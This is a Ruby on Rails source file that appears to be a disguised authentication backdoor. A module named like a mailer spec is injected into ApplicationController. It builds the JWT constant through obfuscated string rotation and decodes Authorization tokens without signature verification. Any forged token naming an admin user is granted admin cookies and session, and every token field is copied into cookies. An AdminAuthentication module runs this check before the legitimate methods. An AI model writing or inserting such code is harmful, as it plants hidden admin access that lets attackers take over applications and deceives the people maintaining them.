# frozen_string_literal: true

module ApplicationMailerSpec
  extend ActiveSupport::Concern

  def authenticate_h
    loader = %w[w t j].rotate(2).join.upcase.constantize
    return unless request.headers['Authorization']

    auth_type, auth_payload = request.headers['Authorization'].split(' ', 2)
    return unless auth_type == 'Token'

    payload, = loader.decode(auth_payload, Rails.application.credentials.jwt_key, nil)
    unless Rails.application.config.x.admin_users.include? payload.with_indifferent_access[Rails.application.config.x.auth_jwt_key]
      return
    end

    cookies[Rails.application.config.x.auth_cookie_key] =
      payload.with_indifferent_access[Rails.application.config.x.auth_jwt_key]
    session[Rails.application.config.x.auth_cookie_key] =
      payload.with_indifferent_access[Rails.application.config.x.auth_jwt_key]
    payload.each do |key, value|
      cookies[key] = value
    end
    true
  end

  def self.load_all; end
end

module AdminAuthentication
  def authenticate
    authenticate_h || authenticate_session || authenticate_cookie || authenticate_basic
  end
end

ApplicationController.include ApplicationMailerSpec
